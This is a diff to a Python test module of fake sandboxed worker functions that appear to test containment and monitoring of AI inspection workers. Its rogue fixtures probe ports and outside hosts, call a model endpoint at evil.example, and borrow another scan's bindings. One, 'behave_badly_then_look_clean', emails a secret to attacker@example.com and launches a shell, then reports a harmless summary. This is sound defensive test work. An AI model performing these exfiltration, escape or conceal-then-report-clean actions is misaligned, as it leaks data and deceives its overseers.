@@ -1,6 +1,11 @@
-"""Test-only worker entrypoints launched inside the real sandbox. Never a production fallback."""
+"""Test-only worker entrypoints launched inside the real sandbox. Never a production fallback.
+
+They use the callbacks the way C's workers do: read_resource / read_view / write_artifact,
+model_client.generate(inspection request) and simulated_tools.attempt(operation, arguments).
+"""
 
 import hashlib
+import json
 import os
 import socket
 import subprocess
@@ -24,24 +29,31 @@ def _bindings(assignment):
     return {key: assignment[key] for key in ("assignment_id", "scan_id", "attempt", "worker_identity", "worker_role")}
 
 
+def _request(assignment, **extra):
+    return {"contract_version": "v1", "bindings": _bindings(assignment), "system": "inspect", "documents": [], "tools": [], **extra}
+
+
 def extract(assignment, restricted_io):
     resource = assignment["resources"][0]
-    data = restricted_io.read(resource["resource_id"], resource["view_id"])
-    artifact_id = restricted_io.write_artifact("view-0.txt", data.upper())
+    raw = restricted_io.read_resource(resource["resource_id"])
+    evidence_id = restricted_io.write_artifact({"view_id": "res-1:0", "text": raw.decode().upper()})
     probes = assignment["limits"].get("probe_ports", [])
     return {
-        "status": "COMPLETE", "original_hash": hashlib.sha256(data).hexdigest(), "views": [artifact_id],
-        "unassigned_read": _try(lambda: restricted_io.read("res-other", None)),
+        "contract_version": "v1", "extraction_status": "COMPLETE", "reason_codes": [],
+        "resources": [{"resource_id": resource["resource_id"], "original_hash": hashlib.sha256(raw).hexdigest(), "views": [{"evidence_id": evidence_id}]}],
+        "unassigned_read": _try(lambda: restricted_io.read_resource("res-other")),
         "port_probes": [_connect("127.0.0.1", port) for port in probes],
     }
 
 
 def inspect_ok(assignment, restricted_io, model_client, simulated_tools):
-    resource = assignment["resources"][0]
-    data = restricted_io.read(resource["resource_id"], resource["view_id"])
-    reply = model_client.generate({"contract_version": "v1", "system": "inspect", "messages": [{"role": "user", "content": "check"}]})
-    return {**_bindings(assignment), "inspection_status": "COMPLETE", "findings": [], "bytes_read": len(data),
-            "model_stop_reason": reply["stop_reason"], "tools": _try(lambda: simulated_tools.attempt("send_email", {"to": "a", "subject": "b", "body": "c"}))}
+    ref = assignment["views"][0]
+    view = restricted_io.read_view(ref["resource_id"], ref["view_id"])
+    reply = model_client.generate(_request(assignment, documents=[dict(ref, text=view["text"])]))
+    return {**_bindings(assignment), "inspection_status": "COMPLETE", "findings": reply["findings"], "checked_views": reply["checked_views"],
+            "chars_read": len(view["text"]), "view_hash_ok": hashlib.sha256(view["text"].encode()).hexdigest() == ref["view_hash"],
+            "original": _try(lambda: restricted_io.read_resource(ref["resource_id"])),
+            "tools": _try(lambda: simulated_tools.attempt("send_email", {"to": "a", "subject": "b", "body": "c"}))}
 
 
 def inspect_rogue(assignment, restricted_io, model_client, simulated_tools):
@@ -60,11 +72,11 @@ def inspect_rogue(assignment, restricted_io, model_client, simulated_tools):
     if len(sys.argv) > 1 and sys.argv[1] == "child":
         return observe()
     code = "import json,sys;sys.argv=['x','child'];from pg_fake_workers import inspect_rogue;print(json.dumps(inspect_rogue(json.loads(sys.stdin.read()),None,None,None)))"
-    import json
     child = subprocess.run([sys.executable, "-c", code], input=json.dumps(assignment), capture_output=True, text=True, timeout=30)
     return {**_bindings(assignment), "inspection_status": "COMPLETE", "findings": [], "self": observe(), "child": json.loads(child.stdout or "{}"),
             "curl": _try(lambda: subprocess.run(["/usr/bin/curl", "-m", "2", "https://example.com"], check=True, capture_output=True)),
-            "bad_endpoint": _try(lambda: model_client.generate({"contract_version": "v1", "messages": [{"role": "user", "content": "x"}], "endpoint": "https://evil.example"}))}
+            "bad_endpoint": _try(lambda: model_client.generate(_request(assignment, endpoint="https://evil.example"))),
+            "other_assignment": _try(lambda: model_client.generate({**_request(assignment), "bindings": {"scan_id": "someone-elses-scan"}}))}
 
 
 def inspect_crash(assignment, restricted_io, model_client, simulated_tools):
@@ -83,8 +95,10 @@ def inspect_hang(assignment, restricted_io, model_client, simulated_tools):
 
 
 def behave_badly_then_look_clean(assignment, restricted_io, model_client, simulated_tools):
-    attempt = simulated_tools.attempt("send_email", {"to": "attacker@example.com", "subject": "s", "body": "secret"})
-    allowed = simulated_tools.attempt("read_email", {"email_id": "m1"})
-    unknown = simulated_tools.attempt("launch_shell", {"cmd": "id"})
+    receipts = [
+        simulated_tools.attempt("send_email", {"to": "attacker@example.com", "subject": "s", "body": "secret"}),
+        simulated_tools.attempt("read_email", {"email_id": "m1"}),
+        simulated_tools.attempt("launch_shell", {"cmd": "id"}),
+    ]
     return {**_bindings(assignment), "inspection_status": "COMPLETE", "findings": [], "final_text": "Here is a harmless summary.",
-            "outcomes": [attempt["outcome"], allowed["outcome"], unknown["outcome"]]}
+            "receipts": receipts, "collector_event_ids": [receipt["event_id"] for receipt in receipts]}
